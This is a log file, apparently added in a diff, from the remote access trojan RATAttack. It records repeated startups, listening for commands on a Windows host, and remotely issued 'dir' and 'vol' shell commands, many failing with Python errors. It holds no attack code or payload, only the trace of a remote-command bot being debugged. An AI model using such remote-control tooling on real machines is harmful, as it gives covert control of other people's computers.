+2020-07-19 11:47:45 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:47:45 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:47:45 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:47:55 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:47:55 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:47:55 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:48:05 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:48:05 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:48:05 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:48:15 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:48:15 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:48:15 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:48:25 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:48:25 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:48:25 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:48:35 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:48:35 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:48:35 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:48:46 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:48:46 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:48:46 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:48:56 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:48:56 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:48:56 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:49:06 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:49:06 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:49:06 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:49:16 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:49:16 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:49:16 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:49:26 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:49:26 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:49:26 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:49:36 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:49:36 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:49:36 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:49:46 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:49:46 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:49:46 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:49:56 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:49:56 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:49:56 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:50:06 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:50:06 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:50:06 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:50:16 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:50:16 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:50:16 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:50:27 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:50:27 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:50:27 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:50:31 - Info: Starting
+2020-07-19 11:50:31 - SUCCESS: Setup done
+2020-07-19 11:50:31 - Info: Starting
+2020-07-19 11:50:31 - SUCCESS: Started
+2020-07-19 11:50:31 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:50:31 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:50:31 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:50:31 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:50:41 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:50:41 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:50:41 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:50:51 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:50:51 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:50:51 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:51:01 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:51:01 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:51:01 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:51:11 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:51:11 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:51:11 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:51:21 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:51:21 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:51:21 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:51:31 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:51:31 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:51:31 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:51:41 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:51:41 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:51:41 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:51:49 - Info: Starting
+2020-07-19 11:51:49 - SUCCESS: Setup done
+2020-07-19 11:51:49 - Info: Starting
+2020-07-19 11:51:49 - SUCCESS: Started
+2020-07-19 11:51:49 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:51:49 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:51:59 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:52:10 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:52:20 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:57:15 - Info: Starting
+2020-07-19 11:57:15 - SUCCESS: Setup done
+2020-07-19 11:57:15 - Info: Starting
+2020-07-19 11:57:15 - SUCCESS: Started
+2020-07-19 11:57:15 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:57:16 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:57:16 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:57:16 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:57:26 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:57:26 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:57:26 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:57:36 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:57:36 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:57:36 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:57:46 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:57:46 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:57:46 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:57:56 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:57:56 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:57:56 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:58:06 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:58:06 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:58:06 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:58:16 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:58:16 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:58:16 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:58:26 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:58:26 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:58:26 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:58:36 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:58:36 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:58:36 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:58:46 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:58:46 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:58:46 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:58:57 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:58:57 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:58:57 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:59:07 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:59:07 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:59:07 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:59:12 - Info: Starting
+2020-07-19 11:59:12 - SUCCESS: Setup done
+2020-07-19 11:59:12 - Info: Starting
+2020-07-19 11:59:12 - SUCCESS: Started
+2020-07-19 11:59:12 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:59:12 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:59:12 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:59:12 - Notice: Command  dir ran
+2020-07-19 11:59:22 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:59:22 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:59:22 - Notice: Command  dir ran
+2020-07-19 11:59:32 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:59:32 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:59:32 - Notice: Command  dir ran
+2020-07-19 11:59:43 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:59:43 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:59:43 - Notice: Command  dir ran
+2020-07-19 11:59:53 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:59:53 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:59:53 - Notice: Command  dir ran
+2020-07-19 12:00:03 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:00:03 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:00:03 - Notice: Command  dir ran
+2020-07-19 12:00:13 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:00:13 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:00:13 - Notice: Command  dir ran
+2020-07-19 12:00:23 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:00:23 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:00:23 - Notice: Command  dir ran
+2020-07-19 12:00:33 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:00:33 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:00:33 - Notice: Command  dir ran
+2020-07-19 12:00:43 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:00:43 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:00:43 - Notice: Command  dir ran
+2020-07-19 12:00:53 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:00:53 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:00:53 - Notice: Command  dir ran
+2020-07-19 12:01:03 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:01:03 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:01:03 - Notice: Command  dir ran
+2020-07-19 12:01:13 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:01:13 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:01:13 - Notice: Command  dir ran
+2020-07-19 12:02:38 - Info: Starting
+2020-07-19 12:02:38 - ERROR: Token has not been set, open up RATAttack.py and change the token - then recompile (if applicable).
+2020-07-19 12:04:04 - Info: Starting
+2020-07-19 12:04:04 - SUCCESS: Setup done
+2020-07-19 12:04:04 - Info: Starting
+2020-07-19 12:04:04 - SUCCESS: Started
+2020-07-19 12:04:04 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:04:28 - Info: Starting
+2020-07-19 12:04:28 - SUCCESS: Setup done
+2020-07-19 12:04:28 - Info: Starting
+2020-07-19 12:04:28 - SUCCESS: Started
+2020-07-19 12:04:28 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:04:28 - Warning: Command exec prep
+2020-07-19 12:04:28 - Warning: Executing the command  dir
+2020-07-19 12:04:28 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:04:28 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 12:04:28 - Notice: Command  dir ran
+2020-07-19 12:09:47 - Info: Starting
+2020-07-19 12:09:47 - SUCCESS: Setup done
+2020-07-19 12:09:47 - Info: Starting
+2020-07-19 12:09:47 - SUCCESS: Started
+2020-07-19 12:09:47 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:10:07 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:10:07 - ERROR: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:10:07 - Notice: Command  vol ran
+2020-07-19 12:10:17 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:10:17 - ERROR: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:10:17 - Notice: Command  vol ran
+2020-07-19 12:10:27 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:10:27 - ERROR: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 12:10:27 - Notice: Command  vol ran
+2020-07-19 12:12:24 - Info: Starting
+2020-07-19 12:12:24 - SUCCESS: Setup done
+2020-07-19 12:12:24 - Info: Starting
+2020-07-19 12:12:24 - SUCCESS: Started
+2020-07-19 12:12:24 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:12:24 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:12:24 - ERROR: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 12:12:24 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:12:34 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:12:34 - ERROR: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 12:12:34 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:13:54 - Info: Starting
+2020-07-19 12:13:54 - SUCCESS: Setup done
+2020-07-19 12:13:54 - Info: Starting
+2020-07-19 12:13:54 - SUCCESS: Started
+2020-07-19 12:13:54 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:13:54 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:13:54 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:13:54 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:14:04 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:14:04 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:14:04 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:14:14 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:14:14 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:14:14 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:14:24 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:14:24 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:14:24 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:14:34 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:14:34 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:14:35 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:14:45 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:14:45 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:14:45 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:14:55 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:14:55 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:14:55 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:15:05 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:15:05 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:15:05 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:15:15 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:15:15 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:15:15 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:15:25 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:15:25 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:15:25 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:15:35 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:15:35 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:15:35 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:15:45 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:15:45 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:15:45 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:15:55 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:15:55 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:15:55 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:16:05 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:16:05 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:16:05 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:16:15 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:16:15 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:16:16 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:16:26 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:16:26 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:16:26 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:16:36 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:16:36 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:16:36 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:16:46 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:16:46 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:16:46 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:16:56 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 12:16:56 - ERROR: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 12:16:56 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:17:07 - Info: Starting
+2020-07-19 12:17:07 - SUCCESS: Setup done
+2020-07-19 12:17:07 - Info: Starting
+2020-07-19 12:17:07 - SUCCESS: Started
+2020-07-19 12:17:07 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:17:07 - Notice: Command /cmd_exec vol ran
+2020-07-19 12:19:28 - Info: Starting
+2020-07-19 12:19:28 - SUCCESS: Setup done
+2020-07-19 12:19:28 - Info: Starting
+2020-07-19 12:19:28 - SUCCESS: Started
+2020-07-19 12:19:28 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:19:48 - Notice: Command /cmd vol ran
+2020-07-19 12:19:58 - Notice: Command /cmd vol ran
+2020-07-19 12:20:08 - Notice: Command /cmd vol ran
+2020-07-19 12:20:18 - Notice: Command /cmd vol ran
+2020-07-19 12:20:28 - Notice: Command /cmd vol ran
+2020-07-19 12:20:38 - Notice: Command /cmd vol ran
+2020-07-19 12:20:48 - Notice: Command /cmd vol ran
+2020-07-19 12:20:58 - Notice: Command /cmd vol ran
+2020-07-19 12:21:09 - Notice: Command /cmd vol ran
+2020-07-19 12:21:19 - Notice: Command /cmd vol ran
+2020-07-19 12:21:29 - Notice: Command /cmd vol ran
+2020-07-19 12:21:39 - Notice: Command /cmd vol ran
+2020-07-19 12:21:49 - Notice: Command /cmd vol ran
+2020-07-19 12:21:59 - Notice: Command /cmd vol ran
+2020-07-19 12:22:09 - Notice: Command /cmd vol ran
+2020-07-19 12:22:18 - Info: Starting
+2020-07-19 12:22:18 - SUCCESS: Setup done
+2020-07-19 12:22:18 - Info: Starting
+2020-07-19 12:22:18 - SUCCESS: Started
+2020-07-19 12:22:18 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:22:18 - Notice: Command /cmd vol ran
+2020-07-19 12:22:28 - Notice: Command /cmd vol ran
+2020-07-19 12:22:39 - Notice: Command /cmd vol ran
+2020-07-19 12:24:42 - Info: Starting
+2020-07-19 12:24:42 - SUCCESS: Setup done
+2020-07-19 12:24:42 - Info: Starting
+2020-07-19 12:24:42 - SUCCESS: Started
+2020-07-19 12:24:42 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:24:42 - Notice: Command /cmd vol ran
+2020-07-19 12:24:53 - Notice: Command /cmd vol ran
+2020-07-19 12:25:03 - Notice: Command /cmd vol ran
+2020-07-19 12:25:11 - Info: Starting
+2020-07-19 12:25:11 - SUCCESS: Setup done
+2020-07-19 12:25:11 - Info: Starting
+2020-07-19 12:25:11 - SUCCESS: Started
+2020-07-19 12:25:11 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:25:12 - Notice: Command /cmd vol ran
+2020-07-19 12:25:22 - Notice: Command /cmd vol ran
+2020-07-19 12:25:32 - Notice: Command /cmd vol ran
+2020-07-19 12:25:42 - Notice: Command /cmd vol ran
+2020-07-19 12:25:52 - Notice: Command /cmd vol ran
+2020-07-19 12:26:02 - Notice: Command /cmd vol ran
+2020-07-19 12:26:04 - Info: Starting
+2020-07-19 12:26:04 - SUCCESS: Setup done
+2020-07-19 12:26:04 - Info: Starting
+2020-07-19 12:26:04 - SUCCESS: Started
+2020-07-19 12:26:04 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:26:04 - Notice: Command /cmd vol ran
+2020-07-19 12:26:14 - Notice: Command /cmd vol ran
+2020-07-19 12:31:55 - Info: Starting
+2020-07-19 12:31:55 - SUCCESS: Setup done
+2020-07-19 12:31:55 - Info: Starting
+2020-07-19 12:31:55 - SUCCESS: Started
+2020-07-19 12:31:55 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:31:56 - Notice: Command /cmd vol ran
+2020-07-19 12:32:06 - Notice: Command /cmd vol ran
+2020-07-19 12:32:16 - Notice: Command /cmd vol ran
+2020-07-19 12:32:26 - Notice: Command /cmd vol ran
+2020-07-19 12:32:36 - Notice: Command /cmd vol ran
+2020-07-19 12:32:46 - Notice: Command /cmd vol ran
+2020-07-19 12:32:56 - Notice: Command /cmd vol ran
+2020-07-19 12:33:06 - Notice: Command /cmd vol ran
+2020-07-19 12:33:16 - Notice: Command /cmd vol ran
+2020-07-19 12:33:26 - Notice: Command /cmd vol ran
+2020-07-19 12:33:36 - Notice: Command /cmd vol ran
+2020-07-19 12:33:46 - Notice: Command /cmd vol ran
+2020-07-19 12:33:57 - Notice: Command /cmd vol ran
+2020-07-19 12:34:07 - Notice: Command /cmd vol ran
+2020-07-19 12:34:17 - Notice: Command /cmd vol ran
+2020-07-19 12:34:27 - Notice: Command /cmd vol ran
+2020-07-19 12:34:37 - Notice: Command /cmd vol ran
+2020-07-19 12:34:47 - Notice: Command /cmd vol ran
+2020-07-19 12:34:57 - Notice: Command /cmd vol ran
+2020-07-19 12:35:07 - Notice: Command /cmd vol ran
+2020-07-19 12:35:17 - Notice: Command /cmd vol ran
+2020-07-19 12:35:27 - Notice: Command /cmd vol ran
+2020-07-19 12:35:37 - Notice: Command /cmd vol ran
+2020-07-19 12:35:47 - Notice: Command /cmd vol ran
+2020-07-19 12:35:58 - Notice: Command /cmd vol ran
+2020-07-19 12:36:08 - Notice: Command /cmd vol ran
+2020-07-19 12:36:18 - Notice: Command /cmd vol ran
+2020-07-19 12:36:28 - Notice: Command /cmd vol ran
+2020-07-19 12:36:38 - Notice: Command /cmd vol ran
+2020-07-19 12:36:48 - Notice: Command /cmd vol ran
+2020-07-19 12:36:58 - Notice: Command /cmd vol ran
+2020-07-19 12:37:08 - Notice: Command /cmd vol ran
+2020-07-19 12:37:18 - Notice: Command /cmd vol ran
+2020-07-19 12:37:28 - Notice: Command /cmd vol ran
+2020-07-19 12:37:38 - Notice: Command /cmd vol ran
+2020-07-19 12:37:49 - Notice: Command /cmd vol ran
+2020-07-19 12:37:59 - Notice: Command /cmd vol ran
+2020-07-19 12:38:09 - Notice: Command /cmd vol ran
+2020-07-19 12:38:19 - Notice: Command /cmd vol ran
+2020-07-19 12:38:29 - Notice: Command /cmd vol ran
+2020-07-19 12:38:39 - Notice: Command /cmd vol ran
+2020-07-19 12:38:49 - Notice: Command /cmd vol ran
+2020-07-19 12:38:59 - Notice: Command /cmd vol ran
+2020-07-19 12:39:10 - Notice: Command /cmd vol ran
+2020-07-19 12:39:20 - Notice: Command /cmd vol ran
+2020-07-19 12:39:30 - Notice: Command /cmd vol ran
+2020-07-19 12:39:35 - Info: Starting
+2020-07-19 12:39:35 - SUCCESS: Setup done
+2020-07-19 12:39:35 - Info: Starting
+2020-07-19 12:39:35 - SUCCESS: Started
+2020-07-19 12:39:35 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:39:36 - Notice: Command /cmd vol ran
+2020-07-19 12:40:24 - Info: Starting
+2020-07-19 12:40:24 - SUCCESS: Setup done
+2020-07-19 12:40:24 - Info: Starting
+2020-07-19 12:40:24 - SUCCESS: Started
+2020-07-19 12:40:24 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:40:24 - Notice: Command /cmd vol ran
+2020-07-19 12:40:34 - Notice: Command /cmd vol ran
+2020-07-19 12:40:44 - Notice: Command /cmd vol ran
+2020-07-19 12:40:54 - Notice: Command /cmd vol ran
+2020-07-19 12:41:04 - Notice: Command /cmd vol ran
+2020-07-19 12:41:14 - Notice: Command /cmd vol ran
+2020-07-19 12:41:55 - Info: Starting
+2020-07-19 12:41:55 - SUCCESS: Setup done
+2020-07-19 12:41:55 - Info: Starting
+2020-07-19 12:41:55 - SUCCESS: Started
+2020-07-19 12:41:55 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:41:55 - Notice: Command /cmd vol ran
+2020-07-19 12:42:05 - Notice: Command /cmd vol ran
+2020-07-19 12:43:16 - Info: Starting
+2020-07-19 12:43:16 - SUCCESS: Setup done
+2020-07-19 12:43:16 - Info: Starting
+2020-07-19 12:43:16 - SUCCESS: Started
+2020-07-19 12:43:16 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:43:16 - Notice: Command /cmd vol ran
+2020-07-19 12:43:26 - Notice: Command /cmd vol ran
+2020-07-19 12:43:36 - Notice: Command /cmd vol ran
+2020-07-19 12:43:46 - Notice: Command /cmd vol ran
+2020-07-19 12:43:56 - Notice: Command /cmd vol ran
+2020-07-19 12:44:00 - Info: Starting
+2020-07-19 12:44:00 - SUCCESS: Setup done
+2020-07-19 12:44:00 - Info: Starting
+2020-07-19 12:44:00 - SUCCESS: Started
+2020-07-19 12:44:00 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:44:00 - Notice: Command /cmd vol ran
+2020-07-19 12:44:10 - Notice: Command /cmd vol ran
+2020-07-19 12:44:25 - Info: Starting
+2020-07-19 12:44:25 - SUCCESS: Setup done
+2020-07-19 12:44:25 - Info: Starting
+2020-07-19 12:44:25 - SUCCESS: Started
+2020-07-19 12:44:25 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:44:26 - Notice: Command /cmd vol ran
+2020-07-19 12:44:36 - Notice: Command /cmd vol ran
+2020-07-19 12:44:46 - Notice: Command /cmd vol ran
+2020-07-19 12:45:36 - Info: Starting
+2020-07-19 12:45:36 - SUCCESS: Setup done
+2020-07-19 12:45:36 - Info: Starting
+2020-07-19 12:45:36 - SUCCESS: Started
+2020-07-19 12:45:36 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:45:36 - Notice: Command /cmd vol ran
+2020-07-19 12:45:46 - Notice: Command /cmd vol ran
+2020-07-19 12:45:57 - Notice: Command /cmd vol ran
+2020-07-19 12:46:07 - Notice: Command /cmd vol ran
+2020-07-19 12:46:12 - Info: Starting
+2020-07-19 12:46:12 - SUCCESS: Setup done
+2020-07-19 12:46:12 - Info: Starting
+2020-07-19 12:46:12 - SUCCESS: Started
